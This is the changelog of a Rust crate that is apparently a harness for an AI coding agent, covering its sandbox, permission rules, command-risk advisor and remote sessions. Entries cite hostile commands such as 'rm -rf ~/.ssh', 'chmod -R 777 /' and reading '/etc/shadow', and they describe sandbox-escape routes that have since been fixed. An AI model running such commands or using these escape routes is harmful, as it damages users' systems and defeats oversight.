# changelog

All notable changes to this crate are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the crate follows
[semantic versioning](https://semver.org/spec/v2.0.0.html) - with the usual pre-1.0 caveat that a
minor bump may break you.

## [unreleased]

### breaking

- **`--advise` rates commands and decides nothing, and it is `shell-advisor`'s.** The advisor was
  asked about every call the rules were going to allow, and could refuse it or turn it into a
  question: a `setup` call in a session started with `--allow setup` went to a person, and
  answering `always` added a `setup:policy` row that changed nothing. An `allow` is the user's
  decision, so nothing reopens it now - what the rules allow runs unasked and nothing about it is
  sent. The advisor is asked only where each shell command a question is about lands on the
  rubric, which is drawn in the question. Feature `advise` is the System One client alone and no
  longer adds `--advise`; `shell-advisor` does. `Advised::said` is gone with the sentences it
  returned.

- **`remote::Serving::last` takes the `Serving` and hands back a future to await.** It says the
  last lines, as before, and the future is the session waiting up to two seconds for its
  connections to write what they still owe and close. A loop of its own that ends a served
  session calls `serving.last(&app).await` where it called `serving.last(&app)`.

- **`introspect::install` hands back an `introspect::Installed`**, and `App::introspect` holds
  one, where both were an `Arc<Kernel>`. It keeps the same handle the tools reach the kernel
  through, and `Installed::forked` says what forks have been charged, for the spend ceiling to
  count. A caller that held the value to keep the tools alive holds it the same way.

### added

- **A command the advisor could not rate says so.** Where the rating would be, the question says
  `the advisor could not rate this` and why, on the screen and in a projection's new `unrated`
  list for a client to draw. The failure is not random: the advisor's endpoints sit behind a
  firewall that refuses requests by what is in them, and what it refuses - `/etc/shadow`, a secret
  piped to `curl` - is the command a colour is most for, which drew no line at all and read as one
  nobody had anything to say about. `Advised::why_unrated` and `App::why_unrated` answer it, and
  the browser page draws it.

- **The readme shows the program.** Two screenshots, of the chat and context tabs, are woven into
  what it says about the tools a session manages itself with. They are linked by address and kept
  out of the published crate.

- **`sandbox::confines_unix_sockets`** answers whether this kernel refuses a confined command a
  connection to a unix socket outside what it may write. Landlock grew the right for it in ABI 9,
  which is Linux 7.1, and below that there is none to ask for. It is a question rather than an
  assumption because handling a right the kernel does not have costs the whole ruleset its `Full`
  status, and a sandbox that calls itself partially enforced over a right it was never going to
  enforce is worse than one that says what it does.

- **A question about every operation a tool has says why it is.** A call that names no operation
  declares all of them, which is the strictest reading of a call nobody can place and the right
  one - but nothing said so, and a session started with `--allow fs:read` was then asked about
  `fs:write` with no way to see that its rule and the call could never meet. The permission panel
  and a headless run now say which it is: a call that named nothing, or one that named something
  the tool does not do, and what a rule that would have answered looks like.

- **A release attaches a Mac binary as well.** `aarch64-apple-darwin`, built on `macos-latest`,
  which is that runner's own host - so it is a second entry in the matrix rather than anything
  cross-compiled. It is **unsigned**: Gatekeeper quarantines a download and the first run is
  refused until `xattr -d com.apple.quarantine kamchatka`, which is what a paid Apple Developer
  account would fix and there is not one. It runs the shell unconfined, as any `kamchatka` off
  Linux does.

### changed

- **The rubric draws its line at the working directory.** The middle level was "leaves something
  changed that could be put back", and nearly everything could be: `chmod -R 777 /`, a global
  `npm install`, `git config --global` and an edit to `~/.bashrc` were all drawn yellow beside
  `cargo build`. Yellow is now a change to files inside the working directory, the way git or a
  rebuild could undo, and red is anything outside it - system files, permissions, the home
  directory, the machine, another account, a remote service - as well as what cannot be got back
  and what is sent off the machine. The bottom level names reading, listing, searching and
  changing directory, so a `cd` is no longer one answer away from yellow. The destructive claim
  asked beside the rubric draws the same line, and the panel's band names say it.
- **What a tool keeps of one call has a ceiling: 8 MiB, `tools::KEPT`.** The output limit decides
  what the model is shown and the whole is archived beside it, so the whole was whatever arrived -
  a `yes` nobody stopped grew the process, the archive and every save after it without end, and so
  did the chat tab showing it stream in. Past the ceiling `shell` goes on reading each stream to
  its end and lets it go, a line that never ends included, and the result says how many bytes
  went under the status line, where no output limit cuts it; `fs` refuses a file past it with a
  sentence pointing at `grep` and at `head`, `tail` and `sed -n`.

- **A command the model runs is not handed this program's keys.** `KAMCHATKA_API_KEY`,
  `OPENROUTER_API_KEY`, `OPENAI_API_KEY`, `KAMCHATKA_SYSTEM1_API_KEY` and `TYPESAFE_API_KEY` are
  taken out of the `shell` tool's environment, confined or not, so `printenv` no longer puts the
  key paying for the session into the context, the request and the record. The list is
  `endpoint::KEYS`. An MCP server and a local advisor still inherit them: each is a program the
  person chose, running unconfined, and a server with an API of its own may read one of these
  names for it. A command that needs one of these names is handed it on purpose, in a file it
  reads, rather than inheriting the session's.

- **`tests/remote.rs` is `tests/remote/`**, the way `tests/screen/` and `tests/introspect/`
  already are: one binary named for the directory, `main.rs` holding what every file in it reaches
  for - a served session, the `Peer` that speaks the protocol by hand, the two tools that answer
  slowly - and nine files for the nine things it is about. It had grown to 3,900 lines, the
  largest file in the workspace and half again the next test suite, with the seams already drawn
  as section banners. Not one test changed.

- **The sandbox suite is two: `tests/sandbox.rs` for what needs a process, `tests/boundary.rs` for
  what does not.** The first is `#![cfg(target_os = "linux")]`, as it was; the second is
  `#![cfg(unix)]`, and holds the six tests that never spawn anything - which paths `Reach` admits,
  what a refusal names, the `~` refused in words rather than expanded, what a confinement travels
  as on a command line, what the scratch directory may be made through, and which errors
  `Sandbox::note_for` will claim. All six were behind the Linux gate because the file was, so the
  `macos-latest` column in CI passed without running any of them. Nothing moved in `src`.

- The docs say that `tools::Careful::new` asks about everything rather than allowing reads, that
  an MCP tool is judged as its server where it declares `mcp:call`, that `config::Settings` has
  two keys with no argument behind them, `border` and `tools`, and that a file `attach` has no
  name for is read as text and refused if it is not text.

### fixed

- **The empty permissions tab says which answer puts a row there.** It named `a` and `n`, and only
  `a` records anything; `y` and `n` answer the one call. It also said the path rules bind `read`,
  `write` and `edit`, where they bind every `fs` operation handed a path, `grep` and `glob`
  included.

- **A chain's destructive link is underlined when the whole command reads as destructive too.**
  The fold kept the first reading to reach the worst band, and the whole command's comes first, so
  a tie - which is what `cargo build && rm -rf ~/.ssh` is, since a destructive link makes the whole
  read as destructive - pointed at nothing. The stage is kept on that tie now, and the whole
  command only where no stage reaches its band.

- **A running turn says `esc stops it` once.** The chat tab said it in its footer and on the
  status line beneath; the status line is on every tab, so it says it there alone.

- **`up` in an empty prompt scrolls when there is nothing to put back.** It recalls the last
  message, and before one had been sent it did nothing at all - the one prompt from which the key
  that scrolls at the top of any other did not. It scrolls there now.

- **`log` refuses an `ids` entry that is not an item number.** It kept the numbers it could read
  and dropped the rest, so `ids: [12, -1]` answered as a filter on item 12 alone; only a list with
  no number in it at all was refused. It reads `ids` the way `context` does now, refusing the call
  and naming the entry.

- **A client that ends a served session is told it did.** The connections were tasks nobody
  waited for, so a host that exited on a `/quit` could take the answer to it and `session.finished`
  with it. The client that typed `/quit` read the closed socket as a drop and went looking for a
  session that was gone. The session now waits for its connections before it returns.

- **A client whose session has gone gives up on it.** An attempt that could not connect counted as
  a connection the session had answered on, and that starts the waits again - so a `--connect`
  whose session had exited tried every quarter of a second for as long as it ran and never reached
  the minute it gives up after.

- **`/quit` and `/restart` wait for a running turn before the record is written.** Both ended the
  loop at once, and an interrupt does not abort a step already in flight, so the rest of a streamed
  answer and the result of a running tool landed after `session.finished`, in files already
  written, while a restarted session ran beside it. The screen and a served session now stop the
  turn and take in what it does until it ends, for up to five seconds (`app::LEAVING`); a turn
  still going then is said to be, and the record ends on its `turn.interrupted`. `/quit` stops the
  turn as `/restart` already did. `App::wait_for_turn` is the wait, for a loop of its own.

- **What a `fork` is charged counts against the spend ceiling.** A fork is a kernel of its own,
  and the ceiling was added up off this session's events alone, so a model calling `fork draft`
  over and over spent a full-context request each time and none of it reached `/spend`. The fork
  adds what its provider reported once its request is over, and the session counts it when the
  call finishes, stopping the turn there if that crosses the line.

- **`fs write` and `fs edit` no longer empty a file before writing it.** The open truncated, so a
  full disk or a killed process midway left a file shorter than either version of it. The new
  contents go into a file beside it, which is renamed over it, and the directory both happen in is
  opened beneath what it was allowed under, as `Reach::open` does. A rename puts a different file
  at the path, so the permission bits are copied across, and the file is written in place as before
  where a rename would change more than its contents: another hard link shares it, the new file
  would not have its owner and group, or the directory will not take a new file. Extended
  attributes are not carried. `Reach::replace` is the operation.

- **The file tools open what they checked.** `read`, `write`, `edit` and `grep` resolved a path,
  checked it against the reach and then opened it by name, so a directory replaced by a link
  between the two - by a background command the model had left running, say - was followed out.
  They open through `Reach::open` now, which on Linux is `openat2` with `RESOLVE_BENEATH` from the
  directory the path was allowed under, and the kernel refuses the swap. A kernel without
  `openat2`, and every other platform, opens as before. `grep` opens a file reached through a link
  by what the link resolved to, since an open that stays beneath the root refuses an absolute link
  even where it points inside.

- **A headless run that leaves on an error still records a session that ended.** The line driver
  ends the session itself and returned before it got there on a line it could not read or a stdout
  that went away, so the record was written with no `session.finished` - which reads as a process
  that was killed. The program ends the session wherever the log does not already say it ended.

- **The model cannot take off a pin the person made, on an item it once pinned itself.** What the
  model had pinned was a list of identifiers only its own moves wrote, so an item the person
  unpinned and pinned again stayed on it, and the model's next `restore` removed the person's pin.
  A pin is the model's now while the item still carries the note the model pinned it with; the
  person's pins carry none, and a note the model pins as it writes carries its reason.

- **`--compact` is refused unless it is a fraction.** `80`, meant as a percentage, installed no
  compactor and said nothing, and zero or less installed one that took every tool result. The
  settings file's `compact` is held to the same rule.

- **A session is not recorded into a directory somebody else can read.** The record goes under
  `$TMPDIR/kamchatka`, a fixed name in a directory every user shares, and a directory another user
  made there first could not be made private - the `chmod` failed and was ignored, so the
  transcript went in anyway, readable by them. And the snapshot's name was checked with `exists`,
  which answers no for a link to nothing, so a link planted at the predictable name was written
  through. The directory has to be one only its owner can enter now or nothing is recorded, and
  anything at all at the snapshot's name makes it taken.

- **The browser relay in `examples/` refuses requests from other pages.** It checked neither
  `Host` nor `Origin`, so any page open in the same browser could put `/events` in a frame to open
  a tab and post to `/do` - a line typed into the session, or a question answered `allow` - and a
  page on a name made to resolve to this machine could read the stream as well. A request now has
  to name an address or `localhost`, come from the relay's own page if it says where it came from,
  and post its command as JSON.

- **A blank line down a pipe is nothing, as enter on an empty prompt is.** A headless run sent it
  as an empty message and paid for the answer, and trimmed only the end of a line, so `  /help`
  was a command at the prompt and a message down a pipe.

- **`fs edit` counts overlapping occurrences.** `\n\n` is in three newlines twice, and counted as
  once the edit went ahead on the first and said it had replaced the only one.

- **`grep`'s `ignore_case` reads a quoted `"true"`**, and refuses a word that is neither, the way
  `files_only` beside it always has; it ran a case-sensitive search instead.

- **The compaction panel's header reads as a sentence.** It had fourteen spaces in the middle of
  one, from a string continued without its `\`.

- **A client attaching mid-turn no longer loses the records written while it attached.** The
  projection read the items and the questions waiting and only then the sequence it reflects, while
  the turn went on writing on a task of its own - so a record landing in between was in neither the
  projection nor the stream after it. When that record was `permission.requested`, a piped
  `--connect` saw no question, detached, and left it unanswered. The sequence is read first now; a
  record in that window arrives in both, and the protocol's docs say to apply records by identifier.

- **`--connect`'s minute of reconnecting is a minute per drop.** The time spent waiting was never
  reset after a connection was picked back up, so enough short outages over a day added up to the
  minute, and the next drop gave up without an attempt, saying the session had not answered for
  sixty seconds. It starts again once the session answers on a connection.

- **An `inspect` too large to send is answered in words.** Asking for an item's earlier version is
  how the protocol tells a client to get past an oversized record, and the answer went out as the
  same oversized frame, which the client refused by closing the connection. A command's answer is
  held to the record's rule now: a `failed` naming its size.

- **A socket that cannot be made private is not left behind.** Failing to set its permissions after
  the bind returned without removing the file, so the next `--serve` at that path was refused as a
  stale socket.

- **The model's `context revise` refuses what a person's edit refuses.** A picture, a turn recorded
  as blocks, and a turn that is a call and nothing else are refused by `App::revise`, because text
  written over them destroys what the text was never the whole of - and the model's way in skipped
  the question. Under `--gemini` a revised turn lost its calls, and their results were orphaned and
  quietly repaired out of the request after it.

- **`kamchatka --print-config > kamchatka.json` works.** The settings file was looked for and read
  before the flag was, and the shell had already emptied the file being redirected into - so the
  one documented use of the flag failed with a parse error and left an empty file behind.

- **A settings file's `system` is not pushed again into a resumed session.** The resumed context
  already holds the instruction its first run was given, pinned, and every `-r` added another copy
  beyond compaction's reach. A typed `-s` beside `-r` is still honoured.

- **Two panics on text somebody else wrote.** A tool's output streaming in wide characters was
  shortened by a count of characters taken from a length in bytes, which went below zero once the
  output passed the bound in bytes while short of half of it in characters - a panic inside the
  event handler every loop runs, and in a release build a marker prepended on every fragment
  after. And `context search` found its match in the lowercased line and sliced the line as
  written at the same offset, which lands inside a character wherever lowercasing changes one's
  length: a Kelvin sign before the match, and the turn was gone.

- **A `shell` call answers when its output is not text, and when it leaves something running.**
  Standard output was read a line at a time as UTF-8, and the first line that was not stopped the
  reading - so `cat` of a picture left the pipe full, the command blocked writing into it, and the
  call never came back; standard error was read the same way and lost whole to one Latin-1 byte.
  And the end of standard output was followed by a wait for the end of standard error with no
  clock on it, so `python3 -m http.server > log &` - the background job holding the pipe - was a
  call that never answered and an `esc` that did nothing. Both streams are read as bytes and shown
  lossily, the wait for the command is watched for the interrupt the way the reading is, and
  standard error gets a moment to drain once the command has gone: a result says so when something
  the command started is still holding it.

- **`fs write` no longer follows a dangling symlink out of the working directory.** A link to
  something that did not exist could not be canonicalized, so the boundary check took it for a
  file about to be created, resolved its parent, and approved the link's own path - and the write
  then created the link's *target*, wherever it pointed. A confined command may make links in the
  working directory, and a cloned repository may carry one. The check follows a link it cannot
  canonicalize now, the way the open will, and `Sandbox::reaches` gets the same answer since the
  two share the function.

- **`/step` with a message, refused, said it in a sentence with a hole in the middle.** The
  refusal was written as a two-line string literal without the `\` that joins them, so twenty-six
  spaces of source indentation sat between `send it on its own` and `and it waits`. `cargo fmt`
  does not rewrap the inside of a literal and the test asserted on the first half, so nothing had
  an opinion about it; the test reads the line off `App::loose` now, where it is not wrapped.

- **The published crate no longer carries a compiled Python file.**
  `contrib/__pycache__/laya_advisor.cpython-314.pyc` was committed by accident and `cargo package`
  takes what `git` tracks, so 29 KB of bytecode for one interpreter version went out inside 0.14.0.
  `.gitignore` covers `__pycache__/` now. The advisor script beside it is unaffected.

- **A confined command could have a process outside the confinement act for it.** Landlock governs
  a `connect` only from ABI 9, so every pathname unix socket under `/run` - the session bus, the
  compositor, a container daemon - answered a confined command, and each of those does what it is
  asked with none of the ruleset in force: `systemd-run --user` read and wrote a home directory
  that the same command, run directly, was refused. The working directory was the edge of the
  world for `open` and not for this.

  The ruleset handles `ResolveUnix` where the kernel has it, and grants it on every writable path
  the way it grants `Truncate`, so a command may connect to a socket it could have written to and
  to no other.

  What that costs on Linux 7.1 and up: a daemon reached over a socket outside the working
  directory now needs `--sandbox-allow <the socket>`, and `--sandbox-read` will not do it -
  connecting is the writing half of the rule, because what comes back from a socket is whatever
  the process behind it was willing to do.
- **A browser watching a session through `examples/phone.rs` came back after `/restart`.** It
  could not. `EventSource` reconnects with `Last-Event-ID`, which the relay hands the session as
  `attach { since }` under the name it read off the first projection - and behind that address is
  now a session of its own, with a log of its own, so the attach is refused. That refusal went
  through to the page as an error, the stream closed, the browser opened another a second later
  carrying the same watermark, and the same line arrived again for as long as the tab was open.
  The one thing nobody could see was the session the restart had just started, whose first line
  says where the old one was written.

  The relay does what `remote::Client` does with the same answer, because a relay is a client:
  only a fresh attach can succeed now, so it puts down the watermark and the name and makes one.
  The `attached` that comes back carries the new session's `seq`, which is the `id:` that puts the
  browser's own watermark where it belongs. A version refusal is still passed on untouched -
  nothing mends that one. `examples/gateway.rs` shares the relay and is fixed with it, for the
  restart at the other end of it.

- **`session.finished` was recorded twice for a session `/restart` replaced.** A served loop and a
  headless one each end their own session, because the last record is owed to the stream they are
  writing, and `wiring::Setup::relaunch` ended the one it was handed as well - so the log said
  nothing more would be recorded and then recorded it again. It now ends a session only where the
  loop that handed it over has not, asked of the log, which is the thing the record it is about to
  write is made of. A loop that leaves the ending to `relaunch`, as the drawn one with no socket
  does, is unchanged.

- **A `call` written as a string of JSON is still a call.** `xiaomi/mimo-v2.6-flash` sends the
  wrapper's contents as text, `{"call": "{\"action\": \"read\", …}"}`, and it was not read through
  at all: `action` was not found, so the call declared every operation its tool has and a session
  granted `fs:read` could not read a file, with ``the `action` argument is required`` as the only
  explanation. One that parses to an object is taken, the way flat arguments already were; one that
  does not is refused saying what arrived.

- **A call whose arguments never parsed says what is wrong with them and shows that part.** It
  said `the arguments were not JSON` and quoted the first 200 characters, which is the wrong two
  hundred: of twelve such calls in one session, four had the fault past the cut, so the message
  quoted the part that was fine and left out the part that was not. It now carries the parser's
  own account - where the text stops, or where an escape went wrong - and a window around that
  rather than the opening.

## [0.14.0] - 2026-09-21

### breaking

- **The `assisted-shell` feature is `shell-advisor`.** The last of the "assist" spelling, which
  is a word about the other kind of model. One mechanism with two names is a bug by this
  repository's own rules, and the advisor is what this one is called everywhere else.

  Nothing about what it does moved: `--advise` in a build carrying it still asks for the verdict
  and the rating both.

- **The advisor's three variables are `KAMCHATKA_SYSTEM1_*`**, where they were
  `KAMCHATKA_TYPESAFE_*`: `KAMCHATKA_SYSTEM1_API_KEY`, `KAMCHATKA_SYSTEM1_BASE_URL` and
  `KAMCHATKA_SYSTEM1_MODEL`. A session exporting the old names loses its advisor with the message
  that asks for a key, rather than failing quietly.

  `TYPESAFE_API_KEY`, without the prefix, is unchanged and still read - it is TypeSafe's own
  documented variable and not this program's to rename. The three that moved are the ones this
  program invented, and they name the kind of model rather than the company selling one: the
  question types a System One engine answers are the category's, the open ones arriving now have
  the same three, and `KAMCHATKA_SYSTEM1_BASE_URL` has always been able to point somewhere else.

  `endpoint::advise::Account` follows, with `TypeSafe` and `OpenRouter` becoming `Dedicated` and
  `Borrowed` - which is what the two cases were about all along. One is a key held for the
  decision service, wherever that is pointed; the other is the conversation's own key, and it is
  the only one carrying a rule about where it may go. That rule is unchanged, and so is the test
  that holds it.

- `tools::Rated` has a `worst` field and is `#[non_exhaustive]`, which it should have been from
  the start - it is a struct this crate answers with and nothing outside it builds. Reading it is
  unchanged; building one by hand is what stops compiling, and `protocol::Judged` grew the same
  field under the same rule.

- `protocol::Message` has an `Oversized` variant, and `protocol::write` is split into `framed` and
  `write_frame` - which is what lets a caller ask how long a message is before sending it. Adding
  the variant is not a break on the wire, because `Message::Unknown` is what an older client reads
  it as and reads as nothing; it is a break for anything in Rust matching on the enum, which is not
  `#[non_exhaustive]`.

- `endpoint::connect` and `endpoint::gemini::connect` take `Option<&str>` rather than anything that
  becomes a `String`, because a session may now have no model. `None` builds the client and skips
  the probe, since there is nothing to ask a context limit about; an embedder that always names one
  wraps the argument in `Some`.

- `wiring::Setup` has a `record` field, `true` by default, which is what `--no-record` turns off.
  A `Setup` built with `..Default::default()`, the shape its own docs give, is unchanged; one
  written out field by field names it now.

### added

- **`wiring::record` and `Setup::relaunch`: the safety net is the library's.** Every run of the
  program writes its session out when it ends, and `/restart` writes the old one out on the way to
  the new one. Both were private to `main.rs`, so an embedder driving an `App` with a loop of its
  own had neither, `examples/phone.rs` included. `record` writes the log and the snapshot under
  the temporary directory, `0700`, beside rather than over a session of the same name, and says
  where; `Setup::relaunch` ends the session it is handed, records it unless `Setup::record` is
  off, and wires a fresh one out of the same settings under a fresh name. `main.rs` calls both
  where it used to have its own.

- **`/restart` writes the session out and puts a fresh one in its place**, which is what quitting
  and running the program again would do, without quitting. The old session's record is the same
  one the end of a run writes - a session somebody restarted is a session that ended, and a run
  abandoned halfway is the case that safety net is most for - and the line naming it is the first
  thing the new session says, because the new one is the only place left to say it in.

  It goes back to the **flags**, not to where the session had got to: the model is `--model`
  again, the permissions are `--allow` and `--deny`, a tool `/tools toggle` switched off is back,
  `--system` and `--files` are re-read, and the context is empty. What carries over is what cannot
  be rebuilt cheaply or at all - the provider connection, the MCP servers, whose tools are
  installed into the new session rather than their processes respawned, and the sandbox, which is
  a ruleset that cannot be lifted once applied. A session started with `-r` restarts into an empty
  one: the snapshot is where the run began, and the command is somebody saying they are done
  with it.

  A running turn is stopped rather than the command refusing until it ends, because a model that
  has found a loop is the commonest reason to type it.

  It works in all three loops. A piped run keeps reading the same input, so the lines after it run
  in the new session - one reader for the run rather than one per session, or whatever the old one
  had read ahead goes with it. Clients attached over a socket are disconnected, since a watermark
  is a record number in a log that is gone; `examples/browser.html` retries and comes back into
  the new session by itself.

- **`SYSTEM1_ADVISOR_COMMAND`: an advisor running on this machine, and nothing leaves it.** Set
  it to a command line and it is used instead of the three `KAMCHATKA_SYSTEM1_*` variables,
  which are then not read at all. `kamchatka/contrib/laya_advisor.py` is the one to point it at:

  ```console
  $ pip install laya
  $ export SYSTEM1_ADVISOR_COMMAND="$HOME/ai/venv/bin/python kamchatka/contrib/laya_advisor.py"
  $ kamchatka --advise
  ```

  This is the honest fix for the disclosure `--advise` is careful about. Everything
  `tools::advice` says is about a third party reading a tool's arguments - which for a write is
  the text being written and for a shell call is the command line - and pointed at a local
  engine there is no third party. The flags still say what they say, because what a flag turns
  on must not depend on an environment variable, but the thing it guards against is not
  happening.

  It is a *command* and not a path because [`laya`](https://github.com/NandhaKishorM/laya) ships
  no executable: no HTTP server, no CLI, no `python -m laya`. It is a library, so the smallest
  thing that reaches it from another process is an interpreter and a script, and the shim is
  that script - about forty lines, most of them comments, because laya's question dicts and
  answers already use the same three types under the same names as the hosted engine. The
  protocol is therefore not a new one: it is the body `Jev::render` builds, one JSON object per
  line, read back by the same `Answers` the HTTP path uses.

  Both of the child's streams are held rather than inherited, which matters most on a first run:
  `laya` downloads a checkpoint and says so at length, and a child sharing the terminal writes
  over the screen `ratatui` is drawing. Piping it is not enough on its own - a pipe nobody reads
  fills and blocks the writer, so the engine would stop answering while writing its own
  diagnostics - so stderr is drained for the life of the child and the last twenty lines are
  kept, hung on the end of whatever failure they explain.

  The process is started once and kept. A 421M-parameter checkpoint costs seconds to load and
  milliseconds to run, so loading one per question would put that wait in front of somebody
  deciding whether to press `y` - which is the one thing this kind of model was chosen for not
  doing. It is killed with the session, and its stderr is inherited rather than piped, so what
  it says about itself reaches the terminal instead of filling a buffer nobody reads.

  Every failure closes the pipe: a command that is not there, a child that stopped answering, a
  line that did not parse, a question that took longer than 30s. Not because one lost question
  matters, but because the *next* read off a doubtful stream is the answer to the question
  before it - an advisor confidently rating the wrong command is worse than no advisor. After
  that the standing rules decide alone, which is what an unreachable hosted advisor already did.


- **The released binary is built with `shell-advisor`.** It is the one feature that has to be
  compiled in to exist at all, and somebody who downloaded a binary cannot add it afterwards - so
  the download was a `--advise` that the readme documents and the artifact did not have.

  Nothing is sent anywhere without `--advise` on the command line, which is the disclosure and
  always was. What the feature gate buys is keeping a third-party dependency out of builds that
  do not want one, and a released binary is by definition not one of those. What it costs is that
  the two opt-ins become one for anybody using this binary: in a build carrying both, `--advise`
  turns on the verdict *and* the rating, and the rating is asked about every command the model
  writes rather than only the ones the rules would allow. The flag's own `--help` names that
  wider disclosure; building from source with `--features advise` alone is still the narrower
  one.

- **A command joined at its `|`, `&&` or `;` is rated stage by stage and drawn as its worst
  stage, with that stage underlined.** One score for a whole command line is the reading a long
  chain is worst served by: three quarters of `cargo build --release && cargo test && rm -rf
  ~/.ssh` is the work an agent does all day, and it is the last quarter a person answering has to
  see. Every stage is a question in the *same* request, evaluated on its own against the same
  state, so a twelve-stage pipeline costs the round trip a one-stage command costs and no stage's
  answer can be moved by another's.

  The fold is over what each stage is **shown** as and not over what it scored, and the order is
  the whole of it. A stage scored `0.4` at 95% is a confident `reads`; one scored `0.1` at 30% is
  a reading nobody could make, and `Rated::shown` lifts it off green because green is the colour
  that says a command is safe. Fold the scores and `0.4` wins, and the command is drawn green on
  the strength of the other stage's coin toss. That is the property
  `an_unsure_rating_is_never_drawn_safer_than_it_scored` holds one stage to, and it does not
  survive being composed unless the fold is done in this order.

  The whole command is folded in with the stages rather than replaced by them, which is what
  makes this only ever a tightening: a pipeline whose every link is ordinary and whose
  composition is not still earns its band from the reading that can see the whole thing, and a
  stage whose answer never arrived costs a tightening that might have happened rather than
  producing one that should not have.

  What is drawn is an underline under the stage that earned the band, in the command the panel is
  already showing. Not a colour - the highlighting still says which part of the stage is a path -
  and not a second line naming the stage, which would cost a row at a terminal and most of the
  screen on a phone. The band line above it is unchanged. `protocol::Judged` carries the byte
  range so a client can point at it too, because that is the one thing the other end cannot work
  out for itself: it would need `joints`, which is Rust in this crate, and which stage the
  advisor liked least, which nothing but the advisor knows.

  A command is rated whole, exactly as before, when it has no joints in it, when it is a heredoc
  (`joints` declines anything with a newline, so a long Python script costs nothing here), when
  it is longer than the 2 kB an argument is cut to - a stage from past the cut would be placed
  against a command the advisor was not shown the end of - and when it has more than eight
  stages, where placing the first eight and folding those would be a rating that silently covered
  part of a command.

- **A turn can be stopped by typing `/stop`, which is the only way a browser can stop one.**
  `esc` and `ctrl+c` are keys and a page has neither, so a session driven from a phone had no way
  to interrupt a running turn at all - `protocol::Command::Interrupt` has been on the wire since
  the first version of it and is a button nothing was obliged to draw. `/step` has pointed at
  this name in as many words for longer than it has existed.

  A turn resting on a permission question is a case it deliberately does not claim. That turn is
  not running - resting is what lets anybody answer it - and an interrupt reaches nothing, so the
  question would still be there afterwards. What ends that turn is denying it, and `/stop` says
  so rather than reporting that nothing is running.

- **A context item can be edited in a browser, where `e` edits one at a terminal.** A row's body
  opens as a box holding what the item says; typing in it and letting go puts that back through
  the same `App::revise` the keys commit through, so the item keeps its identifier, its kind, its
  state and its place in the conversation, and what it said before becomes a version page. The
  row is still what expands and collapses it - a tap on the text is somebody reaching for the
  keyboard, not somebody closing the row.

  An item that has been rewritten carries a second control, left of the state one, saying which
  of its versions the box is showing - `v3/3` for what it says now. Tapping cycles back through
  what it used to say, which is the same history the terminal reads with `enter` and the same
  numbering: `v1` is the oldest still kept. An older version is read-only, because putting one
  back is a *restore* and somebody looking at what a message used to say has not asked for it to
  say that again.

  The three shapes no edit can reach - a picture, a turn recorded in blocks, and a turn that is
  nothing but a call - say so on the row rather than only when an edit is refused, which is
  `protocol::Listed::beyond`. A box let go of unchanged writes nothing at all: no record, no
  version page, and no checkpoint, because an operation that changes nothing takes none.

- **A settings file is found where you are standing, and `--print-config` hands you one to start
  from.** `kamchatka.json` ships in the crate and in the release archive, and `cargo install`
  copies no files - so the starting point reached everybody except the people who installed this
  the way the readme tells them to. The binary carries a copy now, and
  `kamchatka --print-config > kamchatka.json` is the same bytes wherever it came from.

  Given no `--config-file`, two places are looked in: `./kamchatka.json`, then
  `kamchatka/kamchatka.json` under `XDG_CONFIG_HOME` or `~/.config`. The working directory first,
  because a file next to the thing it describes is the one somebody means, and nothing walks up
  from there - the surprise grows with the distance, and typing the flag costs one flag. A file
  that applies because of where you are standing is one that can surprise you, so a session that
  picked one up says `settings read from <path>` into the conversation, which is what every
  projection carries. A path somebody typed is not announced, because they know which file it was.

  Nothing is looked for under `--connect`, which takes nothing else on principle: the model, the
  key, the tools and the sandbox all belong to whoever is serving.

- **`--serve` and `--connect`: a session with a socket in front of it.** The third loop over the
  same `App`, beside the one that draws and the one that reads lines. `kamchatka --serve
  unix:/run/k.sock` runs a session nobody is looking at; `kamchatka --connect unix:/run/k.sock`
  attaches to it, drives it from lines on stdin, and writes what `--headless` writes - the records
  to stdout, what a person reads to stderr - so it is a drop-in for `--headless` in a script.
  Nothing in `nachalnik` knows any of this exists, which was the test this was held to rather than
  a remark about it.

  **The session belongs to the program running it, not to whoever is attached**, and every other
  decision falls out of that one. A turn carries on with nobody watching, a question waits for
  somebody to come back and answer it, and a client picking the session up an hour later picks up
  the same session. `--connect` detaches when its input closes and never ends anybody's session on
  the way out.

  **Two streams, and only one of them can be lost.** A `Record` is numbered from 1, is in the
  session log, and the log is unbounded by decision - so the numbered half of what a client reads
  is not something the server hands out, queues, or is able to drop: each connection holds a
  `Kernel` of its own and reads `history_since(wherever it had got to)`. A client that fell behind,
  lagged, slept, or was not connected when a record was written gets it by asking for it by
  sequence. The other half is `model.delta` and `tool.output`, which are not in the log unless
  `Config::record_progress` says so - unnumbered, best-effort, and gone once they have gone past,
  with a count of what was missed. What that buys is that **there is no outbound queue per client
  anywhere in the server**: a connection that stops reading stops being written to, and loses
  exactly the thing that could not have been recovered anyway.

  **An event stream on its own cannot render a conversation, and pretending otherwise is the
  mistake this avoids.** The log names things rather than copying them - `context.added` carries an
  identifier, a kind, a label and a token count, and not one word of content - which is what keeps
  it affordable enough to keep for ever, and what leaves a client fed nothing but records able to
  follow a turn as it streams and unable to render anything that happened before it connected. So
  attaching answers with a *projection*: the conversation as it reads now, every item as a row, the
  budget, the questions outstanding, what the policy will say. Deliberately not a `Snapshot`, which
  carries every item's whole content and would push megabytes at a phone that has asked for
  nothing; the whole of any one item is an `inspect` away.

  **There is no authentication in the protocol and none is planned**, so where it listens is the
  whole of the boundary: a unix socket's file permissions, or a loopback port. Binding anywhere
  else is refused rather than documented as something not to do, because this protocol carries a
  `shell` tool - reaching the session is reaching the machine. Across a network, tunnel something
  that does authenticate.

  Newline-delimited JSON rather than a length prefix: `serde_json` escapes every control character
  it writes, so a compact value never contains a literal newline and there is nothing for a
  delimiter to be confused by - and the stream stays readable with `nc` and `jq`, which a frame
  header would have cost for nothing. What remote control added to this crate's dependencies is
  `tokio`'s `net` feature and `socket2`, which is one method on a port and a crate `tokio` already
  builds for `net` - which is why `remote` is not behind a feature of its own the way `tui` and
  `mcp` are.

- **`examples/attached.rs`: a client of somebody else's session over a port, in about a hundred
  lines.** It attaches, prints the projection, asks a question, follows the turn, refuses any
  permission question it is asked, reads the item the answer was recorded as, and detaches. What it
  reaches for is `remote::protocol`, `tokio`, and three plain data types the protocol borrows from
  `app` - `Speaker`, `Did` and `Page`, an enum of seven, an enum of three and two strings. No `App`,
  no wiring, and not `remote::Client`, which is how the claim that `protocol` is what moves if
  somebody else needs to speak this gets checked rather than asserted. Its header carries the wire
  transcript, because a client in another language needs the JSON and no Rust at all.

- **A served session draws too, so one session is the desk and the phone at once.** `--serve` used
